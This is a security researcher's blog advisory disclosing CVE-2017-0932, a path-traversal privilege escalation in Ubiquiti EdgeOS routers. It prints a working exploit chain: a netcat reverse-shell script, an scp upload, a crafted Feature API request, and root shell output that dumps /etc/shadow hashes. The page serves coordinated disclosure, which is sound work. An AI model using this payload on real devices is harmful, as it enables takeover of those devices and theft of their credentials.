<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset='utf-8'>
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="/assets/css/style.css?v=">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation | Maycon Vitali</title>
<meta name="generator" content="Jekyll v3.9.2" />
<meta property="og:title" content="UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation" />
<meta name="author" content="Maycon Vitali" />
<meta property="og:locale" content="en" />
<meta name="description" content="UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system." />
<meta property="og:description" content="UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system." />
<link rel="canonical" href="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html" />
<meta property="og:url" content="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html" />
<meta property="og:site_name" content="Maycon Vitali" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-03-05T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Maycon Vitali"},"dateModified":"2018-03-05T00:00:00-03:00","datePublished":"2018-03-05T00:00:00-03:00","description":"UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.","headline":"UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html"},"url":"http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body> 
    <div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = 'https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.11';
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
    <header class="site-header">
    <div class="container lang-selector">
		<ul>

	
	

	<li>
	
		<a href="/404-br.html?ref=/advisories/2018/03/05/CVE-2017-0932.html" class="br">
			<img title="Português Brasileiro" src="/assets/images/lang/br.png" class="desaturate" />
		</a>
	
	</li>


	
	

	<li>
	
		<a href="/advisories/2018/03/05/CVE-2017-0932.html" class="en">
			<img title="English" src="/assets/images/lang/en.png" />
		</a>
	
	</li>


</ul>
	</div>
    <div class="container">
        <h1>Maycon Vitali</h1>
        <h2>I hack stuff!</h2>
    </div>
    <nav id="menu">
        <div class="container">
            <ul>
	
		
			<li class='menu-icon'><a href="http://0.0.0.0:4000/en/home"><img src="/assets/images/icons/home.png" /></a></li>
		
	
		
			<li><a href="http://0.0.0.0:4000/en/about">About</a></li>
		
	
		
			<li><a href="http://0.0.0.0:4000/en/posts">Posts</a></li>
		
	
</ul>
        </div>
    </nav>
</header>

    <div class="container">
        <section id="main_content">
            <div class="post">
	<header class="post-header">
	    <h2 class="post-title">UBNT EdgeOS <= v1.9.1.1 Local Privilege Escalation</h2>
		<div class="fb-like" data-width="" data-href="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html" data-colorscheme="dark"></div>
	</header>

	<div class="post-content">
    	<p>UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.</p>

<ul>
  <li>Vendor: Ubiquiti Networks</li>
  <li>Device: Edger Router X</li>
  <li>Affected Version: 1.9.1.1 and prior</li>
  <li>CVE-ID: CVE-2017-0932</li>
</ul>

<h3 id="details">Details</h3>

<p>The EdgeOS (firmware v1.9.1.1) is susceptible to a local privilege escalation due a Path Traversal vulnerability in the Feature API. This vulnerability allows an attacker with non-privileged access (read-only) to execute commands on the device with the root rights. The attack consists in sending a maliciously crafted file (using scp with a non-privileged account) to the device and then calling the vulnerable API exploiting the Path Traversal. The exploitation will result on the crafted file being executed with root permission, giving the attacker full access to the device.</p>

<h3 id="exploitation">Exploitation</h3>

<p>First of all, we have to create the following file+directory:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat Backdoor/wizard-run
#!/bin/bash
/usr/bin/nc 192.168.2.2:1337 -e /bin/bash &amp;
</code></pre></div></div>

<p>Using a non-privileged ‘operator’ user, it was possible to upload the file to the device using the scp command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ scp -r Backdoor operator@192.168.2.1:~
Welcome to EdgeOS

By logging in, accessing, or using the Ubiquiti product, you
acknowledge that you have read and understood the Ubiquiti
License Agreement (available in the Web UI at, by default,
http://192.168.1.1) and agree to be bound by its terms.

operator@192.168.2.1's password: 
wizard-run       
</code></pre></div></div>

<p>After that, using a valid operator session and a path traversal vulnerability, it was possible to call the uploaded file with root privilege:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /api/edge/feature.json HTTP/1.1
Host: 192.168.2.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Referer: https://192.168.2.1/
Content-Type: application/json
X-CSRF-TOKEN: 4310724fdcab5474ab225a105bd6f86d43247dbaf5b7f4aa2ec329a641ec55ec
X-Requested-With: XMLHttpRequest
Content-Length: 90
Cookie: ip_address_top_user_option=total_bytes; PHPSESSID=i6um09hej0ku2k5ctcp6ib56f1nrqhi7; X-CSRF-TOKEN=4310724fdcab5474ab225a105bd6f86d43247dbaf5b7f4aa2ec329a641ec55ec
Connection: close

{"data":{"scenario":"../../../../../home/operator/Backdoor","action":"load"}}
</code></pre></div></div>

<p>And a remote shell will be created:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from 192.168.2.1 44440 received!
id
uid=0(root) gid=102(vyattacfg)
uname -a
Linux ubnt 3.10.14-UBNT #1 SMP Sat Apr 22 06:38:07 PDT 2017 mips GNU/Linux
cat /etc/shadow
root:!:17283:0:99999:7:::
daemon:*:17283:0:99999:7:::
bin:*:17283:0:99999:7:::
games:*:17283:0:99999:7:::
.. snip snip ..
avahi:*:17283:0:99999:7:::
sshd:*:17283:0:99999:7:::
tss:*:17283:0:99999:7:::
ubnt:$1$zKNoUbAo$gomzUbYvgyUMcD436Wo66.:16436:0:99999:7:::
operator:$6$7SVNi.WB68V0QR5t$efMoCyT2H.mEU6M8s2NDSsW1fv7JnT2eAfK2VxuzsIdcYrEvWCILX8G0CYN/4enwrnT1yYjekQa95TxxHxhVj.:16436:0:99999:7:::
</code></pre></div></div>

<h3 id="recommendation">Recommendation</h3>

<p>Upgrade the firmware to the latest available version.</p>

<h3 id="timeline">Timeline</h3>
<ul>
  <li>2017-06-14 - Vulnerability discovered and first report to Ubiquiti Networks</li>
  <li>2017-06-14 - UBNT anwsered and confirmed the vulnerability</li>
  <li>2017-06-14 - Ubiquiti Networks rewarded with a $1,500 bounty</li>
  <li>2017-08-30 - Ubiquiti Networks fixed the vulnerability</li>
  <li>2017-11-24 - Ubiquiti Networks agreed with a partial disclosure of the vulnerability</li>
  <li>2018-03-05 - Disclosure of technical details</li>
</ul>

<h3 id="references">References</h3>

<ul>
  <li><a href="http://maycon.hacknroll.io/advisories/2018/03/05/CVE-2017-0932.html">Maycon’s Page</a></li>
  <li><a href="https://hackerone.com/reports/239719">HackerOne Partial Report</a></li>
  <li><a href="https://community.ubnt.com/t5/EdgeMAX-Updates-Blog/EdgeMAX-EdgeRouter-software-security-release-v1-9-7-hotfix-3/ba-p/2054117">UBNT Software Release Note</a></li>
</ul>


	</div>

	<div class="fb-comments" data-width="100%" data-href="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html" data-colorscheme="dark"></div>
</div> 
        </section>
        <div id="sidebar">
        	<div class="sidebar-module">
    <h4>About Me</h4>
    <img title="Maycon Vitali" src="/assets/images/profile.jpg" alt="Maycon Vitali"/>
    <span>Hi! My name is Maycon Vitali and I have using this personal site to provide information about hacking and InfoSec. Pull up a chair, take off your hat and enjoy the reading.</span>
    <br /><br />

    More information and contacts:<br />
    <a href="mailto:maycon@hacknroll.com" title="mailto: maycon@hacknroll.com">Email</a> /
    <a target="_blank" href="https://github.com/maycon" title="GithubID: maycon">Github</a> /
    <a target="_blank" href="https://linkedin.com/in/mayconvitali" title="LinkedIn: mayconvitali">LinkedIn</a> /
    <a target="_blank" href="https://twitter.com/mayconvitali" title="TwitterID: mayconvitali">Twitter</a>
</div>

<div class="sidebar-module">
    <h4>Disclaimer</h4>
    All and every material and posts on this site represent my own opinion and not those of my employer. All the content of this site should be used purely for educational purposes only. You are solely and personally responsible for your choices, actions, and results obtained through this site content, now and in the future.
</div>

<div class="sidebar-module">
	<h4>Recent Posts</h4>
	
	
		<li><a href="/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html" title="Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell" rel="bookmark">Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell</a></li>
	
		<li><a href="/advisories/2018/03/05/CVE-2017-0932.html" title="UBNT EdgeOS <= v1.9.1.1 Local Privilege Escalation" rel="bookmark">UBNT EdgeOS <= v1.9.1.1 Local Privilege Escalation</a></li>
	
		<li><a href="/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html" title="Talk is cheap. Show me the money!" rel="bookmark">Talk is cheap. Show me the money!</a></li>
	
		<li><a href="/hello-world/2018/01/28/im-back-en.html" title="I'm back!!" rel="bookmark">I'm back!!</a></li>
	
</div>


<div class="sidebar-module">
	<h4>Categories</h4>
	
		<li><a href="/en/categories/#hello-world" title="hello-world" rel="2">hello-world (2)</a></li>
	
		<li><a href="/en/categories/#bug-bounty" title="bug-bounty" rel="2">bug-bounty (2)</a></li>
	
		<li><a href="/en/categories/#embedded-hacking" title="embedded-hacking" rel="3">embedded-hacking (3)</a></li>
	
		<li><a href="/en/categories/#advisories" title="advisories" rel="1">advisories (1)</a></li>
	
		<li><a href="/en/categories/#hacking-tricks" title="hacking-tricks" rel="3">hacking-tricks (3)</a></li>
	
</div>

<div class="sidebar-module">
	<h4>Tags</h4>
	
		<a href="/tags/#hello" title="hello" rel="2">hello</a> &nbsp;
	
		<a href="/tags/#bug-bounty" title="bug-bounty" rel="2">bug-bounty</a> &nbsp;
	
		<a href="/tags/#hackerone" title="hackerone" rel="2">hackerone</a> &nbsp;
	
		<a href="/tags/#ubiquiti" title="ubiquiti" rel="2">ubiquiti</a> &nbsp;
	
		<a href="/tags/#embedded-devices" title="embedded-devices" rel="4">embedded-devices</a> &nbsp;
	
		<a href="/tags/#hacking-embedded" title="hacking-embedded" rel="4">hacking-embedded</a> &nbsp;
	
		<a href="/tags/#IoT-hacking" title="IoT-hacking" rel="4">IoT-hacking</a> &nbsp;
	
		<a href="/tags/#qemu" title="qemu" rel="1">qemu</a> &nbsp;
	
		<a href="/tags/#mips" title="mips" rel="1">mips</a> &nbsp;
	
		<a href="/tags/#ubnt" title="ubnt" rel="1">ubnt</a> &nbsp;
	
		<a href="/tags/#cve" title="cve" rel="1">cve</a> &nbsp;
	
		<a href="/tags/#uart" title="uart" rel="1">uart</a> &nbsp;
	
		<a href="/tags/#serial" title="serial" rel="1">serial</a> &nbsp;
	
		<a href="/tags/#hacking-tricks" title="hacking-tricks" rel="3">hacking-tricks</a> &nbsp;
	
		<a href="/tags/#privilege-escalation" title="privilege-escalation" rel="1">privilege-escalation</a> &nbsp;
	
		<a href="/tags/#linux" title="linux" rel="1">linux</a> &nbsp;
	
		<a href="/tags/#capability" title="capability" rel="1">capability</a> &nbsp;
	
		<a href="/tags/#network" title="network" rel="2">network</a> &nbsp;
	
		<a href="/tags/#pentest" title="pentest" rel="2">pentest</a> &nbsp;
	
</div>
<div class="sidebar-module sb-archive-tree">
    <h4>Archive</h4>







    
    

	
		
			<ul>
		
			<li><label for="year2019">► 2019</label>
				<input type="checkbox" id="year2019" checked/>
				<ul>
					<li><label for="November2019">► November</label>
						<input type="checkbox" id="November2019" checked />
						<ul>
	
	<li>► <a href="/hacking-tricks/2019/11/06/trick-check-outgoing-ports-en.html">Hacking Tricks: Identifying Outgoing TCP Port for Reverse Shell</a></li>

    
	
	
	

    
    

	
		
						</ul>
					</li>
				</ul>
			</li>
		
			<li><label for="year2018">► 2018</label>
				<input type="checkbox" id="year2018" checked/>
				<ul>
					<li><label for="March2018">► March</label>
						<input type="checkbox" id="March2018" checked />
						<ul>
	
	<li>► <a href="/advisories/2018/03/05/CVE-2017-0932.html">UBNT EdgeOS <= v1.9.1.1 Local Privilege Escalation</a></li>

    
	
	
	

    
    

	
					</ul>
				</li>
				<li><label for="February2018">► February</label>
					<input type="checkbox" id="February2018" />
					<ul>
	
	<li>► <a href="/bug-bounty/2018/02/03/talk-is-cheap-show-me-the-money-en.html">Talk is cheap. Show me the money!</a></li>

    
	
	
	

    
    

	
					</ul>
				</li>
				<li><label for="January2018">► January</label>
					<input type="checkbox" id="January2018" />
					<ul>
	
	<li>► <a href="/hello-world/2018/01/28/im-back-en.html">I'm back!!</a></li>

    
	    			</ul>
	    		</li>
	    	</ul>
    	</li>
    </ul>
    
	
	
	

</div>

        </div>
    </div>
    
    
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-112771650-1', 'auto');
        ga('send', 'pageview');
    </script>


<footer class="site-footer">
	<p>Copyright &copy; <a href="/">Maycon Vitali</a></p>
</footer>

    
</body>

</html>